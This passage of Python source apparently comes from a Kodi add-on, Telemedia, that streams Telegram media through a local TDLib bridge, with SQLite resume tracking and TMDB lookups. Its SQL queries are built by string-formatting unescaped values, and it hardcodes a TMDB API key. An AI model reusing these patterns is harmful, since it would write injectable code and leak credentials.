             'info':json.dumps({'@type': 'cancelDownloadFile','file_id':int(id), '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        playing_file=False
        
        logging.warning('playing_file1')
    def update_db(self):
        logging.warning('Self.TMDB:'+str(self.tmdb))
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        self.dbcon = database.connect(cacheFile)
        self.dbcur = self.dbcon.cursor()
        self.dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""season TEXT, ""episode TEXT,""playtime TEXT,""total TEXT, ""free TEXT);" % 'playback')
        self.dbcon.commit()
        self.season=self.season.replace('%20','0').replace(' ','0')
        self.episode=self.episode.replace('%20','0').replace(' ','0')
        if len(str(self.tmdb))<2 and tmdb!='%20':
            only_name=True
            self.dbcur.execute("SELECT * FROM playback where name='%s' and season='%s' and episode='%s'"%(self.saved_name.replace("'","%27"),self.season,self.episode))
        else:
            only_name=False
            self.dbcur.execute("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(self.tmdb,self.season,self.episode))
        match = self.dbcur.fetchall()
        
        
        if match==None:
          self.dbcur.execute("INSERT INTO playback Values ('%s','%s','%s','%s','%s','%s','%s');" %  (self.saved_name.replace("'","%27"),self.tmdb,self.season,self.episode,str(self.g_timer),str(self.g_item_total_time),' '))
          self.dbcon.commit()
        else:
           if len(match)>0:
            name,timdb,season,episode,playtime,totaltime,free=match[0]
            if str(self.g_timer)!=playtime:
                if only_name:
                    self.dbcur.execute("UPDATE playback SET playtime='%s' where name='%s' and  season='%s' and episode='%s'"%(str(self.g_timer),self.saved_name.replace("'","%27"),self.season,self.episode))
                else:
                    self.dbcur.execute("UPDATE playback SET playtime='%s' where tmdb='%s' and  season='%s' and episode='%s'"%(str(self.g_timer),self.tmdb,self.season,self.episode))
                self.dbcon.commit()
           else:
                self.dbcur.execute("INSERT INTO playback Values ('%s','%s','%s','%s','%s','%s','%s');" %  (self.saved_name.replace("'","%27"),self.tmdb,self.season,self.episode,str(self.g_timer),str(self.g_item_total_time),' '))
                self.dbcon.commit()
        self.dbcur.close()
        self.dbcon.close()
    def onPlayBackStopped(self):
        global id,playing_file
        log('(Tele Player) Stop playback')
        num=random.randint(0,60000)
        data={'type':'td_send',
             'info':json.dumps({'@type': 'cancelDownloadFile','file_id':int(id), '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        playing_file=False
        
        logging.warning('playing_file2')
    '''
    def onPlayBackSeek(self, time, seekOffset):
        global id,playing_file
        log('SEEK FOUND')
        self.pause()
       
        log('vidtime:'+str(seekOffset))
        
        td_send({'@type': 'downloadFile','file_id':int(id), 'priority':1,'offset':seekOffset,'limit':0, '@extra': 777.999})
        event=wait_response(777.999)
        playing_file=True
        self.play()
    '''
    def download_buffer(self):
        try:
            buffer_size=long(Addon.getSetting("buffer_size"))
            global id,playing_file
            dp = xbmcgui.DialogProgress()
            
            dp.create('Telemedia', '[B][COLOR=yellow]%s[/COLOR][/B]'%Addon.getLocalizedString(32044))
            num=random.randint(0,60000)
            data={'type':'td_send',
             'info':json.dumps({'@type': 'downloadFile','file_id':int(id), 'priority':2,'offset':(994694350-(993165312)),'limit':994694350, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            j_enent_o=(event)
            
           
            
            j_enent_o=(event)
            once=True
            while True:
                data={'type':'listen',
                 'info':''
                 }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
               
                #event = td_receive()
                
                if dp.iscanceled():
                    try:
                        self.path=event['file']['local']['path']
                    except: 
                        self.path=''
                        pass
                    break
                if self.stop==1:
                    break
                if event:
                    
                    if event.get('@type') =='error':
               
                        xbmcgui.Dialog().ok('Error occurred',str(event.get('message')))
                        break
                    
                        
                        
                    if 'updateFile' in event['@type']:
                        
                        dp.update(int((event['file']['local']['downloaded_prefix_size']*100.0)/buffer_size),'[B][COLOR=green]%s[/COLOR][/B]'%self.saved_name, '[B][COLOR=yellow]%s %s/%s[/COLOR][/B]'%(Addon.getLocalizedString(32045),str(event['file']['local']['downloaded_prefix_size']),str(buffer_size)))
                        if len(event['file']['local']['path'])>0 and event['file']['local']['downloaded_prefix_size']>(0x500):
                            size=event['file']['size']
                           
                            break
                xbmc.sleep(10)
            dp.close()
        except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Main:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
    def download_file(self):
        try:
            buffer_size_d=long(Addon.getSetting("buffer_size"))
            buffer_size=buffer_size_d
            global id,playing_file
            dp = xbmcgui.DialogProgress()
            dp.create('Telemedia', '[B][COLOR=yellow]%s[/COLOR][/B]'%Addon.getLocalizedString(32044),'')
            num=random.randint(0,60000)
            start = time.clock()
            data={'type':'td_send',
             'info':json.dumps({'@type': 'downloadFile','file_id':int(id), 'priority':1,'offset':0,'limit':0, '@extra': num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            do_buffer=True
            if 'expected_size' in event :
                logging.warning('Found Complete')
                if len(event['local']['path'])>0 and  (event['local']['is_downloading_completed']==True):
                    do_buffer=False
                    self.path='Done'
            if do_buffer:
                logging.warning(json.dumps(event))
                if 'size' in event:
                
                    if buffer_size>=event['size']:
                            buffer_size=event['size']-1000
                            
                    j_enent_o=(event)
                    
                    
                    
                    j_enent_o=(event)
                    
                    while True:
                        data={'type':'get_file_size',
                         'info':id
                         }
                        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                        
                        if 'path' in event:
                            path=event['path']
                            file_size=event['file_size']
                            
                            if dp.iscanceled():
                                try:
                                    self.path='Done'
                                except: 
                                    self.path=''
                                    pass
                                break
                            
                            if file_size!=0:
                                
                               
                                    speed=int((file_size//(time.clock() - start)))
                                    t_remiain=(buffer_size_d-file_size)/speed
                                    
                                    dp.update(int((file_size*100.0)/buffer_size),'[B][COLOR=green]%s[/COLOR][/B]'%self.saved_name, '[B][COLOR=yellow]%s %s/%s[/COLOR][/B]'%(Addon.getLocalizedString(32045),str(file_size),str(buffer_size)),str(speed/(1024))+' Kbps / '+str(t_remiain)+' sec')
                                    if len(path)>0 and int(file_size)>=buffer_size:
                                        self.path=path
                                        break
                    xbmc.sleep(10)
                else:
                    self.path='Done'
                    xbmcgui.Dialog().ok('Error occurred',str(event))
                data={'type':'kill_file_size',
                     'info':id
                     }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            dp.close()
        except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Main:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
            self.path='Done'
    def get_resume(self):
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        self.dbcon = database.connect(cacheFile)
        self.dbcur = self.dbcon.cursor()
        self.dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""season TEXT, ""episode TEXT,""playtime TEXT,""total TEXT, ""free TEXT);" % 'playback')
        self.dbcon.commit()
        if len(str(self.tmdb))>2 and self.tmdb!='%20':
            self.dbcur.execute("SELECT * FROM playback where tmdb='%s' and season='%s' and episode='%s'"%(self.tmdb,str(self.season).replace('%20','0').replace(' ','0'),str(self.episode).replace('%20','0').replace(' ','0')))
            
        else:
            self.dbcur.execute("SELECT * FROM playback where name='%s' and season='%s' and episode='%s'"%(self.saved_name.replace("'","%27"),str(self.season).replace('%20','0').replace(' ','0'),str(self.episode).replace('%20','0').replace(' ','0')))
       
        match_playtime = self.dbcur.fetchone()
        if match_playtime!=None:

            name_r,timdb_r,season_r,episode_r,playtime,totaltime,free=match_playtime
            res={}
            res['wflag']=False
            res['resumetime']=playtime
            res['totaltime']=totaltime
        else:
            res=False
            
        set_runtime=0
        if res:
            if not res['wflag']:

                if res['resumetime']!=None:

                    #'Resume From '
                    choose_time=Addon.getLocalizedString(32042)+time.strftime("%H:%M:%S", time.gmtime(float(res['resumetime'])))
                    logging.warning('choose_time')
                    logging.warning(choose_time)
                    if float(res['resumetime'])>=(0.98*(float(res['totaltime']))):
                        selection=1
                        clicked=1
                    else:
                      
                        window = selection_time('Menu',choose_time)
                        window.doModal()
                        selection = window.get_selection()
                        clicked=window.clicked
                        del window
                    if clicked==0:
                        return -1
                    if selection==-1:
                       stop_auto_play=1
                       
                       return 0
                    if selection==0:
                        
                        set_runtime=float(res['resumetime'])
                        set_total=res['totaltime']
                        
                        
                    elif selection==1:
                        
                        
                        set_runtime=0
                        set_total=res['totaltime']
        self.dbcur.close()
        self.dbcon.close()
        return set_runtime
    def playTeleFile(self, id_pre,data,name,no_subs,tmdb,season,episode,original_title,description,resume,l_data,dd,nextup='false'):
      try:
        self.tmdb=tmdb
        self.saved_name=name
        logging.warning('self.saved_name:'+self.saved_name)
        self.season=season
        self.episode=episode
        global id,playing_file,seek_time
        try:
            dialog = xbmcgui.DialogBusy()
            dialog.create()
        except:
            pass
        id=id_pre
        self.stop=0
        self.path=''
        
        link=('http://127.0.0.1:%s/'%listen_port)+id
        if 1:#Addon.getSetting("pre_buffer")=='true':
            thread=[]
            thread.append(Thread(self.download_file))
            
            thread[0].start()
            count_timeout=0
            while self.path=='' :
                xbmc.sleep(10)
                count_timeout+=1
                if (count_timeout>1000):
                    break
            
        
        listItem = xbmcgui.ListItem(name,iconImage=iconimage, thumbnailImage=iconimage, path=link) 
        #listItem.setProperty('inputstreamaddon', 'inputstream.adaptive')
        #listItem.setProperty('inputstream.adaptive.manifest_type', 'hls')
        video_data={}
        logging.warning('season:'+str(season))
        if season!=None and season!="%20" and season!="0":
           video_data['TVshowtitle']=original_title.replace('%20',' ').replace('%3a',':').replace('%27',"'").replace('_',".")
           video_data['mediatype']='tvshow'
           
        else:
           video_data['mediatype']='movies'
        if season!=None and season!="%20" and season!="0":
           tv_movie='tv'
           url2='http://api.themoviedb.org/3/tv/%s?api_key=%s&append_to_response=external_ids'%(tmdb,'653bb8af90162bd98fc7ee32bcbbfb3d')
        else:
           tv_movie='movie'
           
           url2='http://api.themoviedb.org/3/movie/%s?api_key=%s&append_to_response=external_ids'%(tmdb,'653bb8af90162bd98fc7ee32bcbbfb3d')
        if 'tt' not in tmdb:
             try:
                
                
                imdb_id=requests.get(url2).json()['external_ids']['imdb_id']
                
             except Exception as e:
                logging.warning('IMDB err:'+str(e))
                imdb_id=" "
        else:
             imdb_id=tmdb
        

        
        if 'Music File' in description:
            types='music'
            video_data['title']=name
        else:
            types='Video'
            if '@' in name and '.' in name:
                nm=name.split('.')
                ind=0
                for items in nm:
                    if '@' in items:
                        nm.pop(ind)
                    ind+=1
                name='.'.join(nm)
            #video_data['title']=name.replace('.mkv','').replace('.avi','').replace('.mp4','')
            video_data['title']=(xbmc.getInfoLabel("ListItem.title"))
            logging.warning('New Name:'+name)
            video_data['Writer']=tmdb
            video_data['season']=season
            video_data['original_title']=name
            video_data['episode']=episode
            video_data['plot']=(xbmc.getInfoLabel("ListItem.Plot"))
            video_data['imdb']=imdb_id
            video_data['code']=imdb_id
            video_data['icon']=fanart
            video_data['year']=show_original_year
            video_data['imdbnumber']=imdb_id
            video_data['poster']=fanart
            video_data['imdb_id']=imdb_id
            video_data['IMDBNumber']=imdb_id
            video_data['rating']=(xbmc.getInfoLabel ("ListItem.Rating"))
            video_data['genre']=(xbmc.getInfoLabel("ListItem.Genre "))
            video_data['OriginalTitle']=original_title.replace('.mkv','').replace('.avi','').replace('.mp4','')
            

            logging.warning('New Name Hebrew:'+str(name))
            logging.warning(is_hebrew(unicode(name)))
            if no_subs=='1' or is_hebrew(unicode(name)):
                video_data[u'mpaa']=unicode('heb')
        try:
            s=int(season)
            tv_movie='tv'
            video_data['mediatype']='episode'
        except:
            tv_movie='movie'
            video_data['mediatype']='movie'
        listItem.setInfo(type=types, infoLabels=video_data)
        thread=[]

        thread.append(Thread(search_next,dd,tv_movie,id))
            
        
        thread[0].start()
        # url=url2
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        if season!=None and season!="%20":
           table_name='lastlinktv'
        else:
           table_name='lastlinkmovie'
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""o_name TEXT,""name TEXT, ""url TEXT, ""iconimage TEXT, ""fanart TEXT,""description TEXT,""data TEXT,""season TEXT,""episode TEXT,""original_title TEXT,""saved_name TEXT,""heb_name TEXT,""show_original_year TEXT,""eng_name TEXT,""isr TEXT,""prev_name TEXT,""id TEXT);"%table_name)
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""url TEXT, ""icon TEXT, ""image TEXT, ""plot TEXT, ""year TEXT, ""original_title TEXT, ""season TEXT, ""episode TEXT, ""id TEXT, ""eng_name TEXT, ""show_original_year TEXT, ""heb_name TEXT , ""isr TEXT, ""type TEXT);" % 'Lastepisode')
        
        dbcon.commit()
        dbcur.execute("DELETE FROM %s"%table_name)
                 
        match = dbcur.fetchone()
         
        if match==None:
            dbcur.execute("INSERT INTO %s Values ('f_name','%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s','%s');" %  (table_name,' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '))
            dbcon.commit()
            try:
                try:
                    desk=description.replace("'","%27").encode('utf-8')
                except:
                    desk=''
                dbcur.execute("UPDATE %s SET name='%s',url='%s',iconimage='%s',fanart='%s',description='%s',data='%s',season='%s',episode='%s',original_title='%s',saved_name='%s',heb_name='%s',show_original_year='%s',eng_name='%s',isr='%s',prev_name='%s',id='%s' WHERE o_name = 'f_name'"%(table_name,original_title.replace("'","%27"),url.encode('base64'),iconimage,fanart,desk,str(show_original_year).replace("'","%27"),season,episode,original_title.replace("'","%27"),original_title.replace("'","%27"),original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27").replace("'","%27"),'0',original_title.replace("'","%27"),id))
                dbcon.commit()
            except Exception as e:
                logging.warning('Error in Saving Last:'+str(e))
                pass
        
        if table_name=='lastlinktv':
            tv_movie='tv'
        else:
            tv_movie='movie'
        dbcur.execute("SELECT * FROM Lastepisode WHERE original_title = '%s' and type='%s'"%(original_title.replace("'","%27"),tv_movie))

        match = dbcur.fetchone()
        try:
            if match==None:
              try:
                dbcur.execute("INSERT INTO Lastepisode Values ('%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s');" %  (original_title.replace("'","%27"),url,iconimage,fanart,descriptio.replace("'","%27"),show_original_year,original_title.replace("'","%27"),season,episode,id,original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27"),'0',tv_movie))
              except:
                try:
                    dbcur.execute("INSERT INTO Lastepisode Values ('%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s');" %  (original_title.replace("'","%27"),url,iconimage,fanart,description.decode('utf-8').replace("'","%27"),show_original_year,original_title.replace("'","%27"),season,episode,id,original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27"),'0',tv_movie))
                except:
                    dbcur.execute("INSERT INTO Lastepisode Values ('%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s');" %  (original_title.replace("'","%27"),url,iconimage,fanart,' ',show_original_year,original_title.replace("'","%27"),season,episode,id,original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27"),'0',tv_movie))
              dbcon.commit()
             
            else:
              dbcur.execute("SELECT * FROM Lastepisode WHERE original_title = '%s' and type='%s' and season='%s' and episode='%s'"%(original_title.replace("'","%27"),tv_movie,season,episode))

              match = dbcur.fetchone()
             
              if match==None:
                dbcur.execute("UPDATE Lastepisode SET season='%s',episode='%s',image='%s',heb_name='%s' WHERE original_title = '%s' and type='%s'"%(season,episode,fanart,original_title.replace("'","%27"),original_title.replace("'","%27"),tv_movie))
                dbcon.commit()
        except: pass
        dbcur.close()
        dbcon.close()
        if not resume:
            resume_time=self.get_resume()
        else:
            resume_time=resume
        broken_play=True
        
        if resume_time!=-1:
            
            self.play(link,listitem=listItem,windowed=False)
            
            #Waiting for play
            #Please Wait
            dp = xbmcgui . DialogProgress ( )
            dp.create(self.saved_name+'...',Addon.getLocalizedString(32040), '','')
            
            w_time=int(Addon.getSetting("wait_size"))
            
            for _ in xrange(w_time):
                dp.update(0,self.saved_name+'...',Addon.getLocalizedString(32040)+' : '+str(_), '' )
                try:
                    vidtime = self.getTime()
                except:
                    vidtime=0
                    pass
                if self.isPlaying() and vidtime>0:
                    broken_play=False
                    
                    break
                if dp.iscanceled():
                    dp.close()
                    broken_play=False
                   
                    break
                time.sleep(0.100)
            
            
            if not broken_play:
                try:
                    xbmcgui.DialogBusy().close() 
                except:
                    pass
                xbmc.executebuiltin("Dialog.Close(busydialog)")
            
                
            self.path=''
            
            if resume_time>0:
                try:
                    self.seekTime(int(float(resume_time)))
                except Exception as e:
                    logging.warning('Seek Err:'+str(e))
                    pass
            dp.close()
            # try:
                # from sqlite3 import dbapi2 as database
            # except:
                # from pysqlite2 import dbapi2 as database
            # cacheFile=os.path.join(user_dataDir,'database.db')
            # dbcon = database.connect(cacheFile)
            # dbcur = dbcon.cursor()
            # if season!=None and season!="%20":
               # table_name='lastlinktv'
            # else:
               # table_name='lastlinkmovie'
            # dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""o_name TEXT,""name TEXT, ""url TEXT, ""iconimage TEXT, ""fanart TEXT,""description TEXT,""data TEXT,""season TEXT,""episode TEXT,""original_title TEXT,""saved_name TEXT,""heb_name TEXT,""show_original_year TEXT,""eng_name TEXT,""isr TEXT,""prev_name TEXT,""id TEXT);"%table_name)
            # dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""url TEXT, ""icon TEXT, ""image TEXT, ""plot TEXT, ""year TEXT, ""original_title TEXT, ""season TEXT, ""episode TEXT, ""id TEXT, ""eng_name TEXT, ""show_original_year TEXT, ""heb_name TEXT , ""isr TEXT, ""type TEXT);" % 'Lastepisode')
            
            # dbcon.commit()
            # dbcur.execute("DELETE FROM %s"%table_name)
                     
            # match = dbcur.fetchone()
             
            # if match==None:
                # dbcur.execute("INSERT INTO %s Values ('f_name','%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s','%s');" %  (table_name,' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' '))
                # dbcon.commit()
                # try:
                    # try:
                        # desk=description.replace("'","%27").encode('utf-8')
                    # except:
                        # desk=''
                    # dbcur.execute("UPDATE %s SET name='%s',url='%s',iconimage='%s',fanart='%s',description='%s',data='%s',season='%s',episode='%s',original_title='%s',saved_name='%s',heb_name='%s',show_original_year='%s',eng_name='%s',isr='%s',prev_name='%s',id='%s' WHERE o_name = 'f_name'"%(table_name,original_title.replace("'","%27"),url.encode('base64'),iconimage,fanart,desk,str(show_original_year).replace("'","%27"),season,episode,original_title.replace("'","%27"),original_title.replace("'","%27"),original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27").replace("'","%27"),'0',original_title.replace("'","%27"),id))
                    # dbcon.commit()
                # except Exception as e:
                    # logging.warning('Error in Saving Last:'+str(e))
                    # pass
            
            # if table_name=='lastlinktv':
                # tv_movie='tv'
            # else:
                # tv_movie='movie'
            # dbcur.execute("SELECT * FROM Lastepisode WHERE original_title = '%s' and type='%s'"%(original_title.replace("'","%27"),tv_movie))

            # match = dbcur.fetchone()
            # if match==None:
              # try:
                # dbcur.execute("INSERT INTO Lastepisode Values ('%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s');" %  (original_title.replace("'","%27"),url,iconimage,fanart,descriptio.replace("'","%27"),show_original_year,original_title.replace("'","%27"),season,episode,id,original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27"),'0',tv_movie))
              # except:
                # try:
                    # dbcur.execute("INSERT INTO Lastepisode Values ('%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s');" %  (original_title.replace("'","%27"),url,iconimage,fanart,description.decode('utf-8').replace("'","%27"),show_original_year,original_title.replace("'","%27"),season,episode,id,original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27"),'0',tv_movie))
                # except:
                    # dbcur.execute("INSERT INTO Lastepisode Values ('%s', '%s', '%s', '%s','%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s');" %  (original_title.replace("'","%27"),url,iconimage,fanart,' ',show_original_year,original_title.replace("'","%27"),season,episode,id,original_title.replace("'","%27"),show_original_year,original_title.replace("'","%27"),'0',tv_movie))
              # dbcon.commit()
             
            # else:
              # dbcur.execute("SELECT * FROM Lastepisode WHERE original_title = '%s' and type='%s' and season='%s' and episode='%s'"%(original_title.replace("'","%27"),tv_movie,season,episode))

              # match = dbcur.fetchone()
             
              # if match==None:
                # dbcur.execute("UPDATE Lastepisode SET season='%s',episode='%s',image='%s',heb_name='%s' WHERE original_title = '%s' and type='%s'"%(season,episode,fanart,original_title.replace("'","%27"),original_title.replace("'","%27"),tv_movie))
                # dbcon.commit()
                    
            # dbcur.close()
            # dbcon.close()
            if not broken_play:
                with OverlayText() as self._overlay:
                  while (not xbmc.abortRequested) and (self.isPlaying()):
                     # thread=[]

                     # thread.append(Thread(search_next,dd,tv_movie,id))
                        
                    
                     # thread[0].start()
                     try:
                        vidtime = self.getTime()
                     except:
                        vidtime = 0
                     try:
                        self.g_timer=xbmc.Player().getTime()
                        self.g_item_total_time=xbmc.Player().getTotalTime()
                     except:
                        pass
                     
                     if  xbmc.getCondVisibility('Player.Seeking') or xbmc.getCondVisibility('Player.Caching'):
                        self._overlay.open()
                     else:
                        self._overlay.close()
                     if self._overlay.isShowing():
                            data={'type':'get_file_size',
                             'info':id
                             }
                            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                            
                            
                            needed_size=self.g_timer*(int(event['total_size'])/(self.g_item_total_time))
                            
                            show_str='הורדה: '+str(event['downloaded'])+', גודל: '+str(event['total_size'])+', דרוש: '+str(needed_size)
                            ready_size=event['downloaded']
                            
                            
                            self._overlay.setText('אנא המתן לטעינה \n'+show_str)
                            
                                
                            time.sleep(0.100)
                            
                            continue
                     time.sleep(0.1)
            else:
                logging.warning('Sending 404')
                data={'type':'stop_now',
                     'info':''
                     }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        #dp.create('Please Wait...','Closing File', '','')
        #dp.update(0, 'Please Wait...','Canceling File', '' )
        log('(Tele Player) The playback has stop222')
        log('(Tele Player) STOPED')
        self.stop=1
        num=random.randint(0,60000)
        data={'type':'td_send',
             'info':json.dumps({'@type': 'cancelDownloadFile','file_id':int(id), '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        #dp.update(0, 'Please Wait...','Removing File', '' )
        if resume_time!=-1:
            self.update_db()
        time.sleep(1)
        clear_files()
        playing_file=True
        #dp.close()
        return broken_play,resume_time
      except Exception as e:
            import linecache
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN Main:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
       
            
def get_custom_params(item):
        param=[]
        item=item.split("?")
        if len(item)>=2:
          paramstring=item[1]
          
          if len(paramstring)>=2:
                params=item[1]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param  
def get_params():
        param=[]
        if len(sys.argv)>=2:
          paramstring=sys.argv[2]
          if len(paramstring)>=2:
                params=sys.argv[2]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param     

def download_photo(id,counter,f_name,mv_name):
   try:
    
    logging.warning('mv_name:'+mv_name)
    #if xbmcvfs.exists(mv_name):
    #    return mv_name
    logging.warning('mv_name Not found:'+mv_name)
    data={'type':'download_photo',
             'info':id
             }
    logging.warning('Sending')
    file=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning('file:'+file)
    xbmc.sleep(100)
    if xbmcvfs.exists(file):
        try:
            shutil.move(file,mv_name)
        except Exception as e:
            logging.warning('File copy err:'+str(e))
            pass
        
    else :
        logging.warning('File not found')
        return 'None'
    
    return mv_name
   except Exception as e:
        import linecache
        exc_type, exc_obj, tb = sys.exc_info()
        f = tb.tb_frame
        lineno = tb.tb_lineno
        filename = f.f_code.co_filename
        linecache.checkcache(filename)
        line = linecache.getline(filename, lineno, f.f_globals)
        logging.warning('ERROR IN Photo:'+str(lineno))
        logging.warning('inline:'+str(line))
        logging.warning(str(e))
        xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia ERR','Err:'+str(e)+'Line:'+str(lineno)))

        return ''

def infiniteReceiver(all_d,last_id):
   global exit_now
   try:
    
    logging.warning('sending')
    dp = xbmcgui . DialogProgress ( )
    dp.create('Please Wait...','Adding Groups', '','')
    dp.update(0, 'Please Wait...','Adding Groups', '' )
   
    num=random.randint(0,60000)
    order=last_id.split('$$$')[1]
    leid=last_id.split('$$$')[0]
    data={'type':'td_send',
             'info':json.dumps({'@type': 'getChats','offset_chat_id':leid,'offset_order':order, 'limit': '100', '@extra': num})
             }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    exit_now=0
   
    if 'status' in event:
        xbmcgui.Dialog().ok('Error occurred',event['status'])
        exit_now=1
    if exit_now==0:
       

        
        
        counter=0
        counter_ph=10000
    
        j_enent_o=(event)
        zzz=0
        items=''
        for items in j_enent_o['chat_ids']:
            
            data={'type':'td_send',
                 'info':json.dumps({'@type': 'getChat','chat_id':items, '@extra':counter})
                 }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            if 'status' in event:
                xbmcgui.Dialog().ok('Error occurred',event['status'])
                exit_now=1
                break
            
            order=event['order']
            
            if dp.iscanceled():
                          dp.close()
                         
                          break
            j_enent=(event)
            
            dp.update(int(((zzz* 100.0)/(len(j_enent_o['chat_ids']))) ), 'Please Wait...','Adding Groups', j_enent['@type'].encode('utf8') )
            if j_enent['@type']=='chat' and len(j_enent['title'])>1:
                
                icon_id=''
                fan_id=''
                fanart=''
                icon=''
                name=j_enent['title']
                logging.warning(name+':'+str(items))
                
                color='white'
                if 'is_channel' in j_enent['type']:
                    if j_enent['type']['is_channel']==False:
                        
                        genere='Chat'
                        color='lightblue'
                    else:
                        genere='Channel'
                        color='khaki'
                else:
                     genere=j_enent['type']['@type']
                     color='lightgreen'
                if 'last_message' in j_enent:
                    plot=name.encode('utf8')
                    pre=j_enent['last_message']['content']
               
                    if 'caption' in pre:
                        plot=j_enent['last_message']['content']['caption']['text'].encode('utf8')
                    elif 'text' in pre:
                        if 'text' in pre['text']:
                            plot=j_enent['last_message']['content']['text']['text'].encode('utf8')
                    
                        
                else:
                    plot=name.encode('utf8')
                dp.update(int(((zzz* 100.0)/(len(j_enent_o['chat_ids']))) ), 'Please Wait...','Adding Groups', name.encode('utf8') )
                zzz+=1
             
                if 'photo' in j_enent:
                   
                   if 'small' in j_enent['photo']:
                     counter_ph+=1
                     icon_id=j_enent['photo']['small']['id']
                     f_name=str(j_enent['id'])+'_small.jpg'
                     mv_name=os.path.join(logo_path,f_name)
                     if os.path.exists(mv_name):
                        icon=mv_name
                     else:
                        icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                   if 'big' in j_enent['photo']:
                     counter_ph+=1
                     fan_id=j_enent['photo']['big']['id']
                     f_name=str(j_enent['id'])+'_big.jpg'
                     mv_name=os.path.join(logo_path,f_name)
                     if os.path.exists(mv_name):
                        fanart=mv_name
                     else:
                        fanart=download_photo(fan_id,counter_ph,f_name,mv_name)
                mode=2
                last_id_fixed='0$$$0$$$0$$$0'
                if 'group links' in name.lower() or 'ערוץ קישורים' in name or 'קישורים לכל הקבוצות' in name:
                    mode=38
                    color='olive'
                    last_id_fixed='0'
